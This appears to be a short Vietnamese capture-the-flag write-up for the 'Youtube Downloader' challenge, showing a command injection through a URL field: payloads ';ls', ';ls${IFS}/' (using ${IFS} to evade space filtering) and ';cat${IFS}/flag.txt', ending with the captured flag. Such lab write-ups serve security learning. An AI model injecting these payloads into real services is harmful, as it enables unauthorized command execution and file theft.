<h1 href="https://battle.cookiearena.org/arenas/cookie-arena-ctf-season-2/battle/youtube-downloader">Youtube Downloader</h1>

Cung cấp 1 url

![](./img/1.png)

Thêm dấu ngắt lệnh <b>;ls</b>

Tên file <b>index.php</b> được trả về

![](./img/2.png)

Kiểm tra thư mục <b>/</b>, thấy file <b>flag.txt</b>
```
;ls${IFS}/
${IFS}: ký tự khoảng trắng trong shell
```
![](./img/3.png)

Đọc flag:
```
;cat${IFS}/flag.txt
```
![](./img/4.png)

```
FLAG: CHH{Ea5y_cOmmaND_inj3c7Ion_48a3fb378305a9dab79569e3060df5cc}
```

